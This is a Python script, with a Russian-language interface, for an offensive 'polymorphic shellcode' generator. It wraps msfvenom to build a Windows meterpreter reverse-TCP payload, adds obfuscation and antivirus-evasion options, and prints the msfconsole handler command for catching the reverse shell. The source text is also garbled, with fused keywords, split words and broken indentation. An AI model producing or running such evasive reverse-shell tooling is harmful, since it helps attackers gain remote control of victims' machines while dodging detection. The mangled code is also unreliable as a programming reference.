







import os



import sys



import subprocess



import tempfile



import argparse











sys.path.append(os.path.dirname(os.path.abspath(__file__)))







from core.managerimport PayloadManager



from core.configimport load_config







defbanner():



    pr in t("""
    ╦ ╦╦ ╦╔╦╗╦═╗╔═╗╔═╗  ╦ ╦╔═╗╔═╗╔╦╗ - SHELLCODE MAKER
    ╠═╣╚╦╝ ║║╠╦╝╠═╣╚═╗  ╠═╣║╣ ╠═╣ ║║
    ╩ ╩ ╩ ═╩╝╩╚═╩ ╩╚═╝  ╩ ╩╚═╝╩ ╩═╩╝
    Скрипт для генерации полиморфного шелл-кода
    """)







defgenerate_shellcode(payload_type,host,port,format_type="raw"):







pr in t(f"[+] Генерация шелл-кода {payload_type} для {host}:{port}...")











try:



        subprocess.run(["msfvenom","--help"],stdout=subprocess.PIPE,stderr=subprocess.PIPE)



except FileNotFoundError:



        pr in t("[-] Ошибка: msfvenom не найден. Установите Metas ploit Framework.")



return None







output_file=tempfile.mktemp()











cmd=[



"msfvenom",



"-p",payload_type,



f"LHOST={host}",



f"LPORT={port}",



"-f",format_type,



"-o",output_file



]







try:



        result=subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)







if result.return code!=0:



            pr in t(f"[-] Ошибка при создании шелл-кода: {result.stderr}")



return None







pr in t(f"[+] Шелл-код успешно создан: {output_file}")



return output_file







except Exceptionas e:



        pr in t(f"[-] Произошла ошибка: {str(e)}")



return None







defparse_arguments():



    parser=argparse.ArgumentParser(description="Hydra's Head Shellcode Generator")







parser.add_argument("--payload","-p",default="w in dows/meterpreter/reverse_tcp",



help="Тип полезной нагрузки msfvenom (по умолчанию: w in dows/meterpreter/reverse_tcp)")



parser.add_argument("--host",required=True,help="IP-адрес для обратного соединения (LHOST)")



parser.add_argument("--port",type=int,required=True,help="Порт для обратного соединения (LPORT)")



parser.add_argument("--output","-o",required=True,help="Имя выходного файла")



parser.add_argument("--obfuscation",choices=["low","medium","high","max"],



default="medium",help="Уровень обфускации")



parser.add_argument("--evas ion",action="store_true",help="Добавить техники обхода обнаружения")



parser.add_argument("--iterations","-i",type=int,default=1,



help="Количество итераций обфускации")







return parser.parse_args()







defmain():



    banner()



args=parse_arguments()











shellcode_file=generate_shellcode(args.payload,args.host,args.port)







if notshellcode_file:



        return1







try:







        config=load_config()



manager=PayloadManager(config)







pr in t(f"[+] Генерация полиморфной нагрузки с шелл-кодом...")











manager.generate(



payload_type="shellcode",



payload=shellcode_file,



output_path=args.output,



obfuscation_level=args.obfuscation,



use_evas ion=args.evas ion,



iterations=args.iterations



)







pr in t(f"[+] Полиморфная нагрузка успешно создана: {args.output}")











os.unl in k(shellcode_file)







pr in t(f"[+] Чтобы принять обратное соединение, запустите:")



pr in t(f"    msfconsole -q -x \"use multi/handler; set payload {args.payload}; set LHOST {args.host}; set LPORT {args.port}; run\"")







except Exceptionas e:



        pr in t(f"[-] Ошибка при создании полиморфной нагрузки: {str(e)}")



return1







return0







if__name__=="__main__":



    sys.exit(main())